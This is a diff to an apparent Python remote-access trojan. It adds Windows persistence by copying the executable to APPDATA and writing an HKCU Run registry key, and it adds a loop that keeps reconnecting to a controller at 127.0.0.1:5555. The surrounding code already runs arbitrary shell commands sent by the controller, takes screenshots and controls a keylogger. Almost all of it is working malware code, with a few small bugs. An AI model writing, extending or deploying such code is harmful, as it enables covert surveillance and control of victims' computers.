@@ -1,4 +1,4 @@
-import socket, json, subprocess, os, pyautogui, keylogger, threading
+import socket, json, subprocess, os, pyautogui, keylogger, threading, sys, shutil, time
 from termcolor import colored
 
 def reliable_send(data):
@@ -38,6 +38,29 @@ def screenshot():
     myscreenshot = pyautogui.screenshot
     myscreenshot.save('screenshot.png')
 
+def persist(reg_name, copy_name):
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + '/t REG_SZ /d "' + file_location + '"', shell=True)
+            reliable_send(colored(f'[+] Createrd Persistence with reg key: {reg_name}', 'green'))
+        else:
+            reliable_recv(colored('[-] persistence already exists', 'yellow'))
+    except:
+        reliable_send(colored('[-] Error creating persistence', 'red'))
+
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            s.connect(('127.0.0.1', 5555))
+            shell()
+            s.close
+            break
+        except:
+            connection()
+
 def shell():
     while True:
         command = reliable_recv()
@@ -69,6 +92,9 @@ def shell():
             keylog.self_destruct()
             t.join()
             reliable_send(colored('[+] keylogger stopped', 'green'))
+        elif command[:11] == 'persistence':
+            reg_name, copy_name = command [12:].split(' ')
+            persist(reg_name, copy_name)
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
@@ -76,5 +102,4 @@ def shell():
             reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 5555))
-shell()
+connection()
